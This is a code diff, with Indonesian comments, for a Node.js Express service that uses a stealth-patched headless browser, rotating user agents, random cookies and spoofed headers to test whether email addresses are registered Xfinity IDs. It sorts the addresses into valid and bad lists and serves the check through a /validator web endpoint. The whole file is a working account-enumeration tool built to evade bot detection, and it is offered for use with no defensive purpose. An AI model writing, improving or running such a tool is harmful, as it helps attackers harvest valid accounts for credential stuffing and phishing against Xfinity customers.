@@ -1,8 +1,8 @@
 const express = require('express');
+const expressStatusMonitor = require('express-status-monitor');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const fs = require('fs');
-const path = require('path'); // Untuk mengelola jalur file
 
 // Menggunakan Stealth Plugin
 puppeteer.use(StealthPlugin());
@@ -15,29 +15,29 @@ const colors = {
     yellow: '\x1b[33m',
 };
 
-// Fungsi untuk membaca User-Agent dari file ua.txt
-function readUserAgentsFromFile(filePath) {
-    try {
-        const data = fs.readFileSync(filePath, 'utf-8');
-        return data.split('\n').filter(line => line.trim() !== ''); // Menghapus baris kosong
-    } catch (error) {
-        console.error(`${colors.red}[ERROR] Failed to read User-Agent file: ${error}${colors.reset}`);
-        return []; // Mengembalikan array kosong jika gagal
-    }
-}
-
-// Membaca User-Agent dari file ua.txt
-const userAgents = readUserAgentsFromFile('ua.txt');
+// Daftar User-Agent yang akan digunakan
+const userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:88.0) Gecko/20100101 Firefox/88.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0.2 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; Nokia 8.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0',
+    'Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    // Tambahkan User-Agent lainnya sesuai kebutuhan
+];
 
 // Fungsi untuk memilih User-Agent acak
 function getRandomUserAgent() {
     const randomIndex = Math.floor(Math.random() * userAgents.length);
     return userAgents[randomIndex];
-}
-
-// Fungsi untuk menghapus karakter tidak valid dari User-Agent
-function sanitizeUserAgent(userAgent) {
-    return userAgent.replace(/[^ -~]+/g, ''); // Menghapus karakter non-printable
 }
 
 // Fungsi untuk delay
@@ -60,15 +60,7 @@ function generateRandomCookies() {
 async function setRandomCookies(page) {
     const cookies = generateRandomCookies();
     await page.setCookie(...cookies);
-    //console.log(`${colors.green}[INFO] Random cookies have been set successfully.${colors.reset}`);
-}
-
-// Fungsi untuk menyimpan konten respons ke file HTML
-async function saveResponseToFile(email, content) {
-    const sanitizedEmail = email.replace(/[^a-zA-Z0-9]/g, '_'); // Sanitasi email untuk nama file
-    const filePath = path.join(__dirname, 'response', `${sanitizedEmail}.html`);
-    fs.writeFileSync(filePath, content);
-    //console.log(`${colors.green}[INFO] Response saved to ${filePath}${colors.reset}`);
+    console.log(`${colors.green}[INFO] Random cookies have been set successfully.${colors.reset}`);
 }
 
 // Fungsi untuk cek email terdaftar di Xfinity
@@ -82,6 +74,14 @@ async function checkEmail(email) {
             '--disable-dev-shm-usage',
             '--disable-software-rasterizer',
             '--no-zygote',
+			'--disable-extensions',
+			'--disable-background-timer-throttling',
+			'--disable-background-networking',
+			'--disable-default-apps',
+			'--disable-translate',
+			'--no-first-run',
+			'--process-per-site',
+			'--memory-pressure-thresholds=low'
         ],
         executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome', // Jalur ke instalasi Chrome di Windows
         slowMo: 100 // Menambahkan slow motion 100ms
@@ -91,14 +91,9 @@ async function checkEmail(email) {
     await setRandomCookies(page); // Set cookie random
 
     // Set User-Agent acak
-    const userAgent = sanitizeUserAgent(getRandomUserAgent());
-    try {
-        await page.setUserAgent(userAgent);
-        //console.log(`${colors.green}[INFO] Random User-Agent set: ${userAgent}${colors.reset}`);
-    } catch (error) {
-        console.error(`${colors.red}[ERROR] Failed to set User-Agent: ${error}${colors.reset}`);
-        return { email: email, status: 'ERROR' };
-    }
+    const userAgent = getRandomUserAgent();
+    await page.setUserAgent(userAgent);
+    console.log(`${colors.green}[INFO] Random User-Agent set: ${userAgent}${colors.reset}`);
 
     // Menambahkan header HTTP
     await page.setExtraHTTPHeaders({
@@ -127,24 +122,25 @@ async function checkEmail(email) {
         // Ambil konten halaman setelah klik
         const content = await page.content();
 
-        // Simpan konten ke file HTML
-        await saveResponseToFile(email, content);
-
         // Cek apakah email tidak ditemukan di halaman respons
         if (content.includes('The Xfinity ID you entered was incorrect')) {
             console.log(`${colors.red}[FAILED] ${email}${colors.reset}`);
             fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke bad.txt
             return { email: email, status: 'FAILED' };
+        } else if (content.includes("You don't have permission to access")) {
+            console.log(`${colors.yellow}[FORBIDDEN] ${email}${colors.reset}`);
+            fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke forbidden.txt
+            return { email: email, status: 'FORBIDDEN' };
+        } else if (content.includes('Something went wrong')) {
+            console.log(`${colors.red}[ERROR] ${email}${colors.reset}`);
+            fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke error.txt
+            return { email: email, status: 'ERROR' };
         } else {
             console.log(`${colors.green}[SUCCESS] ${email}${colors.reset}`);
             fs.appendFileSync('valid.txt', `${email}\n`); // Simpan ke valid.txt
             return { email: email, status: 'SUCCESS' };
         }
 
-    } catch (error) {
-        console.log(`${colors.yellow}[ERROR] ${email}: ${error}${colors.reset}`);
-        fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke bad.txt jika ada error
-        return { email: email, status: 'ERROR' };
     } finally {
         await browser.close();
     }
@@ -158,14 +154,20 @@ const PORT = process.env.PORT || 3000;
 app.get('/validator', async (req, res) => {
     const email = req.query.email; // Ambil email dari query parameter
     if (!email) {
-        return res.status(400).send(`${colors.red}[ERROR] Email must be provided as a query parameter.${colors.reset}`);
+        return res.status(400).send(`Email must be provided as a query parameter`);
     }
-    try {
-        const result = await checkEmail(email);
-        res.json(result);
-    } catch (error) {
-        res.status(500).send(`${colors.red}[ERROR] ${error}${colors.reset}`);
-    }
+    
+    // Hasil dari checkEmail bisa dilempar tanpa try-catch
+    const result = await checkEmail(email);
+    res.json(result);
+});
+
+// Pasang express-status-monitor sebagai middleware
+app.use(expressStatusMonitor());
+
+// Buat route untuk menampilkan dashboard monitoring
+app.get('/status', (req, res) => {
+  res.sendStatus(200);
 });
 
 // Menjalankan server
